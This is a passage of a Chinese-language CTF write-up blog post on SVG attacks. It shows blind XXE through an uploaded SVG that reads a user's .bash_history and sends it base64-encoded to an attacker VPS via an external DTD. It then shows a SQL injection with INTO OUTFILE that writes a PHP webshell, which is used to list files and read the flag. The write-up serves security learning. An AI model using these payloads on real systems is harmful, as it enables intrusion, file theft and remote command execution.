+<li>如果你发现了sql注入，直接getshell吧，flag在/app目录里</li>
+</ul>
+<p>复现过程如下：</p>
+<p>打开网页，有一个框要求输入URL，然后检查URL指向的file是不是svg图片，如果请求的文件不是svg的话就会返回Unauthorized type!</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/SVG%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%BB%91%E9%AD%94%E6%B3%95/image-20201027231920483.png" alt="image-20201027231920483"></p>
+<p>我们先写一个简单的SVG图片源码放在vps上，保存为1.svg</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Note</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-string">&quot;HELLO&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>提交SVG图片源码地址发现实体成功显示，然后我们尝试读取一下用户的history文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Note</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;files;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>页面虽然正常返回信息，但是并不能直接读到我们想要的东西，但是无回显，所以这里就可以利用到盲XXE来外带数据了，也就是通过加载外部一个dtd文件，然后把读取结果以HTTP请求的方式发送到自己的VPS。</p>
+<p>构造1.svg</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Note</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">lab</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://39.105.158.221:1234/xml.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%start;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">font-size</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="symbol">&amp;lab;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造xml.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;ip:1234&#x2F;?%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后我们把1.svg和xml.dtd放到我们的vps上，然后在我们的vps上监听1234端口，再在网页提交1.svg的链接即可成功读取到.bash_history，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;app</span><br><span class="line">php -S 0.0.0.0:8080</span><br></pre></td></tr></table></figure>
+
+<p>可以得知在8080端口有另外一个web服务，我们继续利用XXE数据外带读取源码，修改1.svg的一部分内容如下，其余操作一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;app&#x2F;index.php&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读取到源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;index&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">Hi!</span><br><span class="line">You Find Me .</span><br><span class="line">Flag is nearby.</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$conn=mysql_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&#x27;security&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">    $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    $id = <span class="number">1</span>;</span><br><span class="line">$sql = <span class="string">&quot;select * from user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">$result = mysql_query($sql,$conn);</span><br><span class="line">$arr = mysql_fetch_assoc($result);</span><br><span class="line">print_r($arr);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现sql注入，没有任何的过滤，直接利用into outfile写个一句话木马，当然这里要注意的是传入的时候要url编码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php?id&#x3D;-1&#39; union select 1,&#39;&lt;?php system($_GET[cmd]);&gt;&#39; into outfile&#39;&#x2F;app&#x2F;dashabi.php&#39;#</span><br></pre></td></tr></table></figure>
+
+<p>写完shell之后，继续利用数据外带读取内容，重复上面的步骤即可。</p>
+<p>读取文件目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;dashabi.php?cmd&#x3D;ls&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读取flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;dashabi.php?cmd&#x3D;cat%20H3re_1s_y0ur_f14g.php&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SVG算是一个比较容易让人忽视的点，但是他造成的一些问题却是我们不能够忽视的，在CTF中如果有些题目没有限制SVG这个点的话，我们就可以尝试用他来进行XSS或者XXE，然后在查阅资料的过程，发现在国外有人总结了SVG的攻击XSS的一些payload以及防御的方案，具体可以参考：</p>
+<p><a target="_blank" rel="noopener" href="https://svg.digi.ninja/">https://svg.digi.ninja/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/digininja/svg_xss">https://github.com/digininja/svg_xss</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="http://yulige.top/?p=665">http://yulige.top/?p=665</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.rootnetsec.com/bsidessf-svgmagick/">https://www.rootnetsec.com/bsidessf-svgmagick/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/207639.html">https://www.freebuf.com/vuls/207639.html</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/11/03/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9F%90%E4%BC%97%E6%B5%8B%E7%9A%84%E8%80%83%E6%A0%B8/" rel="prev" title="【转载】记一次某众测的考核">
+      <i class="fa fa-chevron-left"></i> 【转载】记一次某众测的考核
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/11/10/%E6%B5%85%E8%B0%88ctf%E4%B8%AD%E6%97%A0%E5%9B%9E%E6%98%BE/" rel="next" title="【转载】浅谈ctf中无回显">
+      【转载】浅谈ctf中无回显 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SVG%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">SVG简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SVG%E9%80%A0%E6%88%90XSS"><span class="nav-number">3.</span> <span class="nav-text">SVG造成XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B4%E5%A5%94%E4%B8%BB%E9%A2%98"><span class="nav-number">3.1.</span> <span class="nav-text">直奔主题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A8%E6%A0%B9%E9%97%AE%E5%BA%95"><span class="nav-number">3.2.</span> <span class="nav-text">刨根问底</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">3.3.</span> <span class="nav-text">CTF中的应用场景</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SVG%E9%80%A0%E6%88%90XXE"><span class="nav-number">4.</span> <span class="nav-text">SVG造成XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF-1"><span class="nav-number">4.1.</span> <span class="nav-text">CTF中的应用场景</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-number">4.1.1.</span> <span class="nav-text">有回显的情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-number">4.1.2.</span> <span class="nav-text">无回显的情况</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="kawhi"
+      src="http://yuhaojiang.gitee.io/picture/Blog头像.jpg">
+  <p class="site-author-name" itemprop="name">kawhi</p>
+  <div class="site-description" itemprop="description">PHP是世界上最好的语言</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://47.98.234.232:8000/" title="http:&#x2F;&#x2F;47.98.234.232:8000&#x2F;" rel="noopener" target="_blank">G2mtu备用靶场</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://kawhi.gearhostpreview.com/" title="http:&#x2F;&#x2F;kawhi.gearhostpreview.com&#x2F;" rel="noopener" target="_blank">OneDrive网盘</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kawhi</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">269k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:05</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
